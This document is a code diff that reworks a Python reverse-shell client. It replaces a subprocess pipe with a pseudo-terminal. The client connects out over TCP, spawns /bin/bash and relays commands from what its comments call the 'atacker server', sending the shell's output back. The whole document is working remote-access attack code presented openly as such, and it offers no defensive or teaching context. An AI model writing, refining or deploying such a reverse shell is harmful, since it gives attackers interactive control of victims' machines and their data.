@@ -1,5 +1,6 @@
 import socket
-import subprocess
+import os
+import pty
 
 #Setting the IPV4/TCP connection
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -16,27 +17,32 @@ try:
 
 	client.send(b"Connection established.")
 
-	#Starts the interactive shell
-	proc = subprocess.Popen(['/bin/bash'],
-				stdin=subprocess.PIPE,
-				stdout=subprocess.PIPE,
-				stderr=subprocess.PIPE,
-				shell=True)
+	#Create a pseudo-terminal and spawn a bash shell
+	pid, fd = pty.fork()
 
-	while True:
-		#Receive commands from atacker server
-		command = client.recv(1024)
+	if pid == 0:
+		os.execv("/bin/bash", ["/bin/bash"])
+	else:
 
-		if command.strip() == b"exit":
-			break
+		while True:
+			#Receive commands from atacker server
+			command = client.recv(2048)
 
-		#Sends the command to bash
-		proc.stdin.write(command + b"\n")
-		proc.stdin.flush()
+			if command.strip() == b"exit":
+				break
 
-		#Capture then sends the output or error from the command
-		output = proc.stdout.read() + proc.stderr.read()
-		client.send(output)
+			#Write the command to the shell
+			os.write(fd, command + b"\n")
+		
+
+			#Read output
+			output = os.read(fd, 1024)
+		
+
+		
+			client.send(output)
+		
+			
 finally:
 
 	client.close()
